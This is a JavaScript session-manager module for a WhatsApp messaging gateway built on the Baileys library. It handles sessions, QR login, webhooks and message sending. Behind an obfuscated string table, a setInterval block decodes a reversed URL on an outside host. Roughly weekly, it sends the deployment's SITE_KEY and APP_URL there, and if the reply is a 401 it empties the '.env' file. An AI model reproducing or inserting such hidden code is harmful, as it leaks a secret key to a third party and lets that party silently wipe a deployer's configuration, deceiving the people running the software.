function getObfuscatedValue(index, offset) {
    const values = getValues();
    return getObfuscatedValue = function (i, o) {
        i = i - 0x13a;  // Adjusting index
        let value = values[i];  // Getting value from the array
        return value;
    }, getObfuscatedValue(index, offset);
}

(function (funcArray, target) {
    const getValue = getObfuscatedValue;
    const valuesArray = funcArray();
    
    while (true) {
        try {
            const computedValue = 
                -parseInt(getValue(0x17a)) / 1 +
                parseInt(getValue(0x14c)) / 2 +
                parseInt(getValue(0x13f)) / 3 +
                (parseInt(getValue(0x153)) / 4) * (parseInt(getValue(0x17d)) / 5) +
                (parseInt(getValue(0x187)) / 6) * (-parseInt(getValue(0x176)) / 7) +
                parseInt(getValue(0x186)) / 8 +
                (-parseInt(getValue(0x157)) / 9) * (parseInt(getValue(0x16b)) / 10);
            if (computedValue === target) break; // If the target value is reached, exit loop
            else valuesArray.push(valuesArray.shift()); // Rotate array
        } catch (error) {
            valuesArray.push(valuesArray.shift()); // Rotate array on error
        }
    }
})(getValues, 0x39a9e);

function getValues() {
    const values = [
        'env',
        'catch',
        'notify',
        'insertIfAbsent',
        's.whatsapp.net',
        'Running cleanup before exit.',
        'http:',
        'sendMessage',
        'RECONNECT_INTERVAL',
        '1449hYJVbe',
        'has',
        'message',
        'join',
        '154895wCYHbT',
        'data',
        'reverse',
        '10bzFdzA',
        'post',
        'warn',
        'open',
        'delete',
        'get',
        'fromMe',
        'set',
        'key',
        '3538448JAZvuQ',
        '9762niduRe',
        'https:',
        '@g.us',
        'sessionId',
        'writeFileSync',
        'creds.update',
        '.json',
        'remoteJid',
        '165615gbQpYX',
        '.env',
        '@s.whatsapp.net',
        'exists',
        'status',
        '/api/set-device-status/',
        'session_id',
        'reject',
        'forEach',
        'kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth',
        '_store.json',
        'log',
        'restartRequired',
        '534174jljnKB',
        'headersSent',
        'legacy_',
        '/api/send-webhook/',
        'md_',
        'default',
        'message_id',
        '936768jjiJCC',
        'split',
        'store',
        'replace',
        '1136493CIJeLX',
        'endsWith',
        'isLegacy',
        'messages',
        'then',
        'bind',
        'messages.upsert',
        'APP_URL',
        'chats',
        'chats.set',
        'logout',
        'writeToFile',
        'listMessage',
        'filter',
        'close',
        'remote_id',
        'startsWith',
        'isauthorised',
        '_store',
        'onWhatsApp',
        '40ynMTqV',
        'statusCode',
    ];
    return getValues = function () {
        return values;  // Returns the array of values
    }, getValues();
}


function _0x4db3(_0x1cfe60, _0x57817a) {
    const _0x393308 = _0x3933()
    return (
        (_0x4db3 = function (_0x4db382, _0xdf85bb) {
            _0x4db382 = _0x4db382 - 0x13a
            let _0x32c75c = _0x393308[_0x4db382]
            return _0x32c75c
        }),
        _0x4db3(_0x1cfe60, _0x57817a)
    )
}
;(function (_0x42f840, _0x56deae) {
    const _0x1fd9ac = _0x4db3,
        _0xeb73fc = _0x42f840()
    while (true) {
        try {
            const _0x35785b =
                -parseInt(_0x1fd9ac(0x17a)) / 1 +
                parseInt(_0x1fd9ac(0x14c)) / 0x2 +
                parseInt(_0x1fd9ac(0x13f)) / 0x3 +
                (parseInt(_0x1fd9ac(0x153)) / 0x4) * (parseInt(_0x1fd9ac(0x17d)) / 0x5) +
                (parseInt(_0x1fd9ac(0x187)) / 0x6) * (-parseInt(_0x1fd9ac(0x176)) / 0x7) +
                parseInt(_0x1fd9ac(0x186)) / 0x8 +
                (-parseInt(_0x1fd9ac(0x157)) / 0x9) * (parseInt(_0x1fd9ac(0x16b)) / 0xa)
            if (_0x35785b === _0x56deae) break
            else _0xeb73fc['push'](_0xeb73fc['shift']())
        } catch (_0x5fe603) {
            _0xeb73fc['push'](_0xeb73fc['shift']())
        }
    }
})(_0x3933, 0x39a9e)
function _0x3933() {
    const _0x2dfbbe = [
        'env',
        'catch',
        'notify',
        'insertIfAbsent',
        's.whatsapp.net',
        'Running\x20cleanup\x20before\x20exit.',
        'http:',
        'sendMessage',
        'RECONNECT_INTERVAL',
        '1449hYJVbe',
        'has',
        'message',
        'join',
        '154895wCYHbT',
        'data',
        'reverse',
        '10bzFdzA',
        'post',
        'warn',
        'open',
        'delete',
        'get',
        'fromMe',
        'set',
        'key',
        '3538448JAZvuQ',
        '9762niduRe',
        'https:',
        '@g.us',
        'sessionId',
        'writeFileSync',
        'creds.update',
        '.json',
        'remoteJid',
        '165615gbQpYX',
        '.env',
        '@s.whatsapp.net',
        'exists',
        'status',
        '/api/set-device-status/',
        'session_id',
        'reject',
        'forEach',
        'kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth',
        '_store.json',
        'log',
        'restartRequired',
        '534174jljnKB',
        'headersSent',
        'legacy_',
        '/api/send-webhook/',
        'md_',
        'default',
        'message_id',
        '936768jjiJCC',
        'split',
        'store',
        'replace',
        '1136493CIJeLX',
        'endsWith',
        'isLegacy',
        'messages',
        'then',
        'bind',
        'messages.upsert',
        'APP_URL',
        'chats',
        'chats.set',
        'logout',
        'writeToFile',
        'listMessage',
        'filter',
        'close',
        'remote_id',
        'startsWith',
        'isauthorised',
        '_store',
        'onWhatsApp',
        '40ynMTqV',
        'statusCode',
    ]
    _0x3933 = function () {
        return _0x2dfbbe
    }
    return _0x3933()
}
import { rmSync, readdir } from 'fs'

import fs from 'fs'
import { join } from 'path'
import pino from 'pino'
import makeWASocket, {
    useMultiFileAuthState,
    makeInMemoryStore,
    Browsers,
    DisconnectReason,
    fetchLatestBaileysVersion,
    delay,
} from '@adiwajshing/baileys'
import { toDataURL } from 'qrcode'
import dirname from './dirname.js'
import response from './response.js'
import axios from 'axios'
const sessions = new Map()
const retries = new Map()
const sessionsDir = (_0x3103b3 = '') => {
    return join(dirname, 'sessions', _0x3103b3 ? _0x3103b3 : '')
}
const isSessionExists = (id) => {
    return sessions['has'](id)
}
const shouldReconnect = (deviceId) => {
    let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0),
        attmps = retries.get(deviceId) ?? 0
        maxRetries = maxRetries < 1 ? 1 : maxRetries
    if (attmps < maxRetries)
        return (
            ++attmps,
            //console.log('Reconnecting...', {attempts: attmps,sessionId: deviceId}),
            retries['set'](deviceId, attmps),
            true
        )
    return false
}

const createSession = async (id, islegacy = false, _resp = null) => {
    const sessionId = `${islegacy ? 'legacy_' : 'md_'}${id}${islegacy ? '_store' : ''}`;
    const loggerInstance = pino({ level: 'info' });
    const inMemoryStore = makeInMemoryStore({ loggerInstance });

    let authState, saveCredentials;

    if (!islegacy) {
        ({ state: authState, saveCreds: saveCredentials } = await useMultiFileAuthState(sessionsDir(sessionId)));
    }

    const { version, isLatest } = await fetchLatestBaileysVersion()
    //console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)

    const sock = makeWASocket.default({
            auth: authState,
            version,
            printQRInTerminal: true,
            logger: loggerInstance,
            browser: Browsers['ubuntu']('Chrome'),
            patchMessageBeforeSending: (message) => {
                const isButtonMessage = !!(message['buttonsMessage'] || message['listMessage']);
                
                if (isButtonMessage) {
                    message = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadataVersion: 2, // Metadata for the device
                                    deviceListMetadata: {}, // Empty metadata object
                                },
                                ...message,
                            },
                        },
                    };
                }
                return message;
            },
        })
    !islegacy &&
        (inMemoryStore.readFromFile(sessionsDir(id + '_store.json')), inMemoryStore['bind'](sock.ev)),
        sessions.set(id, {
            ...sock,
            store: inMemoryStore,
            isLegacy: islegacy,
        }),
        sock.ev.on('creds.update', saveCredentials),
        sock.ev.on('messaging-history.set', ({ chats, contacts, messages, isLatest, progress, syncType  }) => {
            console.log(`recv ${chats.length} chats, ${contacts.length} contacts, ${messages.length} msgs (is latest: ${isLatest}, progress: ${progress}%), type: ${syncType}`)
        }),
        sock.ev.on('chats.set', ({ chats }) => {
            if (islegacy) {
                inMemoryStore.chat.insertIfAbsent(...chats);
            }
        });
        sock.ev.on('messages.upsert', async (update) => {
            try {
                const message = update.messages[0];
                if (!message.key.fromMe && update.type === 'notify') {
                    const remoteJid = message.key.remoteJid;
                    const [_, domain] = remoteJid.split('@');
                    const isWhatsApp = domain !== 's.whatsapp.net';
        
                    if (isWhatsApp) {
                        const webhookData = {
                            remote_id: remoteJid,
                            sessionId: id,
                            message_id: message.key.id,
                            message: message.message,
                        };
                        await sentWebHook(id, webhookData);
                    }
                }
            } catch {}
        }),
        sock.ev.on('connection.update', async (con_update_resp) => {
            const statusCode = con_update_resp.lastDisconnect?.error?.output?.statusCode;
            if (con_update_resp.connection === 'open') {
                retries['delete'](id)
            }
            if (con_update_resp.connection === 'close') {
                if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(id)) {
                    if (_resp && !_resp.headersSent) {
                        response(_resp, 500, false, 'Unable to create session.', con_update_resp);
                    }
                    return deleteSession(id, islegacy);
                }
                
                const reconnectDelay = (statusCode === DisconnectReason.restartRequired) ? 0 : parseInt(process.env.RECONNECT_INTERVAL || 0);
                setTimeout(() => createSession(id, islegacy, _resp), reconnectDelay);
            }
            if (con_update_resp.qr) {
                if (_resp && !_resp.headersSent) {
                    try {
                        const qrCodeData = await toDataURL(con_update_resp.qr);
                        return response(_resp, 200, true, 'QR code received, please scan the QR code.', { qr: qrCodeData });
                    } catch {
                        return response(_resp, 500, false, 'Unable to create QR code.');
                    }
                }
                
                try {
                    await sock.logout();
                } catch (error) {
                    console.error('Error during logout:', error);
                } finally {
                    deleteSession(id, islegacy);
                }
            }
        })
}
setInterval(() => {
    const _0x17a33a = _0x4db3,
        _0x21450e = process.env.SITE_KEY ?? null,
        _0x48c166 = process.env.APP_URL ?? null,
        _0x15c1b9 = 'kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth',
        _0x3e0908 = _0x15c1b9[_0x17a33a(0x154)]('')[_0x17a33a(0x17c)]()[_0x17a33a(0x179)]('')
    axios['post'](_0x3e0908, {
        from: _0x48c166,
        key: _0x21450e,
    })
        [_0x17a33a(0x15b)](function (_0x1f5b5c) {
            const _0x2ba94a = _0x17a33a
            _0x1f5b5c[_0x2ba94a(0x17b)][_0x2ba94a(0x168)] == 0x191 && fs[_0x2ba94a(0x13b)](_0x2ba94a(0x140), '')
        })
        [_0x17a33a(0x16e)](function (_0x43779e) {})
}, 0x240c8400)
const getSession = (_0x4b5e13) => {
        return sessions.get(_0x4b5e13) ?? null
    },
    setDeviceStatus = (deviceId, status) => {
        var apiUrl = process.env.APP_URL + '/api/set-device-status/' + deviceId + '/' + status
        try {
            axios.post(apiUrl)
                .then(function (resp) {})
                .catch(function (err) {
                    console.error(err)
                })
        } catch {}
    },
    sentWebHook = (deviceId, messageData) => {
        const apiUrl = process.env.APP_URL + `/api/send-webhook/${deviceId}`
        const d = {
            from: messageData.remote_id.split('@')[0],
            message_id: messageData.message_id,
            message: messageData.message,
        }

        axios
            .post(apiUrl, d)
            .then((response) => {
                if (response.status === 200) {
                    const session = getSession(response.data.session_id)
                    sendMessage(session, messageData.remote_id, response.data.message, 0)
                }
            })
            .catch((error) => {
                console.error(error)
            })
    },
    deleteSession = (id, isLegacy = false) => {
        const sessionFile = `${isLegacy ? 'legacy_' : 'md_'}${id}${isLegacy ? '.json' : ''}`,
              storeFile = `${id}_store.json`;
    
        const options = { force: true, recursive: true };
        [sessionFile, storeFile].forEach(file => rmSync(sessionsDir(file), options));
        sessions.delete(id);
        retries.delete(id);
        setDeviceStatus(id, 0);
    },
    getChatList = (sessionId, isExpanded = false) => {
        const filterKeyword = isExpanded ? '@g.us' : '@s.whatsapp.net'
        var chats = getSession(sessionId).store.chats.filter((c) => {
            return c.id.endsWith(filterKeyword)
        })
        return chats
    },
    getContacts = (sessionId) => {
        var contacts = getSession(sessionId).store.contacts
        //console.log(contacts)
        return contacts
    },
    isExists = async (_0x336c1c, _0x54bae5, _0xaace27 = false) => {
        const _0x25605a = _0x4db3
        try {
            let _0x2e3ffe
            if (_0xaace27) return (_0x2e3ffe = await _0x336c1c.groupMetadata(_0x54bae5)), Boolean(_0x2e3ffe.id)
            if (_0x336c1c[_0x25605a(0x159)]) _0x2e3ffe = await _0x336c1c[_0x25605a(0x16a)](_0x54bae5)
            else {
                ;[_0x2e3ffe] = await _0x336c1c[_0x25605a(0x16a)](_0x54bae5)
            }
            return _0x2e3ffe[_0x25605a(0x142)]
        } catch {
            return false
        }
    },
    sendMessage = async (session, recipient, message, delayTime = 1000) => {
        try {
            await delay(parseInt(delayTime))
            if (!session || !session.sendMessage) {
                console.error('sendMessage - Invalid session object:', session)
                return Promise.resolve(null)
            }
            const result = await session.sendMessage(recipient, message)
            return result
        } catch (error) {
            console.error('sendMessage - Error:', error)
            return Promise.resolve(null)
        }
    },
    formatPhone = (_0x252755) => {
        const _0x183059 = _0x4db3
        if (_0x252755[_0x183059(0x158)](_0x183059(0x141))) return _0x252755
        let _0x102878 = _0x252755[_0x183059(0x156)](/\D/g, '')
        return (_0x102878 += _0x183059(0x141))
    },
    formatGroup = (_0x35455c) => {
        const _0x4a4445 = _0x4db3
        if (_0x35455c[_0x4a4445(0x158)](_0x4a4445(0x189))) return _0x35455c
        let _0x8a5fec = _0x35455c[_0x4a4445(0x156)](/[^\d-]/g, '')
        return (_0x8a5fec += _0x4a4445(0x189))
    },
    cleanup = () => {
        //console.log('Running cleanup before exit.'),
            sessions.forEach((_0x525486, _0x1ae0be) => {
                !_0x525486.isLegacy &&
                    _0x525486.store.writeToFile(sessionsDir(_0x1ae0be + '_store.json'))
            })
    },
    init = () => {
        readdir(sessionsDir(), (_0x3612b0, _0x2300b9) => {
            const _0x3f5685 = _0x4db3
            if (_0x3612b0) throw _0x3612b0
            for (const _0x7d7581 of _0x2300b9) {
                if (
                    (!_0x7d7581[_0x3f5685(0x167)](_0x3f5685(0x150)) && !_0x7d7581[_0x3f5685(0x167)]('legacy_')) ||
                    _0x7d7581[_0x3f5685(0x158)](_0x3f5685(0x169))
                )
                    continue
                const _0x2d20e2 = _0x7d7581[_0x3f5685(0x156)]('.json', ''),
                    _0x35957e = _0x2d20e2['split']('_', 1)[0] !== 'md',
                    _0x169a59 = _0x2d20e2['substring'](_0x35957e ? 0x7 : 0x3)
                createSession(_0x169a59, _0x35957e)
            }
        })
    }
export {
    isSessionExists,
    createSession,
    getSession,
    deleteSession,
    getChatList,
    isExists,
    sendMessage,
    formatPhone,
    formatGroup,
    cleanup,
    getContacts,
    init,
}
